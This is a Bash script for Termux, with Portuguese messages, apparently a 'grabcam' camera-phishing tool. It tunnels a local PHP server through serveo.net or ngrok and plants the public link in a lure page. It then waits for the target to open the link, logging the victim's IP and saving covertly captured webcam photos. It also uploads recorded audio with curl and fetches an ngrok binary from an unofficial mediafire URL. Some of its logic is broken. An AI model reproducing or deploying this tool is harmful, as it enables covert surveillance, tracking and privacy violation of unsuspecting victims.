#!/bin/bash
clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear
trap 'printf "\n";stop' 2
banner() {
echo "============================================================";
echo " ██████╗ ██████╗  █████╗ ██████╗  ██████╗ █████╗ ███╗   ███╗";
echo "██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║";
echo "██║  ███╗██████╔╝███████║██████╔╝██║     ███████║██╔████╔██║";
echo "██║   ██║██╔══██╗██╔══██║██╔══██╗██║     ██╔══██║██║╚██╔╝██║";
echo "╚██████╔╝██║  ██║██║  ██║██████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║";
echo " ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝";
echo "============================================================";
echo "        v1.0 coded by github.com/SamSepi0l13"                
echo "        ====================================";
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "Necessita de ter o PHP instalado."; exit 1; }
}
create_photo_folder() {
    if [ ! -d "fotos" ]; then
        mkdir fotos
    fi
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Esperando a alvo,\e[0m\e[1;77m Pressione Ctrl + C para sair...\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] O alvo abriu o Link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto Recebida!\e[0m\n"
mv Log.log fotos/$(date +"%Y%m%d%H%M%S").jpg
termux-media-scan -r fotos/$(date +"%Y%m%d%H%M%S").jpg
rm -rf Log.log
fi
sleep 0.5
done 
}

server() {
    command -v ssh > /dev/null 2>&1 || { echo >&2 "Necessita do SSH instalado."; exit 1; }

    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Iniciando Serveo...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    if [[ $subdomain_resp == true ]]; then
        sh -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink" &
        sleep 8
    else
        sh -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink" &
        sleep 8
    fi

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Iniciando php server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3

    # Agora, verificamos se o arquivo sendlink foi criado antes de tentar usar o grep
    if [[ -e "sendlink" ]]; then
        send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
        printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
    else
        printf '\e[1;93m[\e[0m\e[1;77m-\e[0m\e[1;93m] Falha ao obter o link. Verifique se o servidor está funcionando corretamente.\e[0m\n'
    fi
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php
}

ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Necessita do unzip."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Necessita do wget."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Baixando Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1

if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Escolha a porta ou pressione enter para porta default: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Opcao Invalida!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}

record_audio() {
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Gravando áudio por 15 segundos...\e[0m\n"
    rec -q -r 44100 -b 16 -c 1 -e signed-integer -t raw - trim 0 15 | lame -q 9 -b 45 --resample 22.05 - audio.mp3 > /dev/null 2>&1
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Áudio gravado com sucesso!\e[0m\n"
}

upload_audio() {
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enviando áudio para o servidor...\e[0m\n"
    curl -F "audio=@audio.mp3" $send_link/upload.php > /dev/null 2>&1
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Áudio enviado com sucesso!\e[0m\n"
}

start() {
default_choose_sub="Y"
default_subdomain="grabcam$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Escolher subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
record_audio
upload_audio
checkfound
}

banner
dependencies
create_photo_folder
start1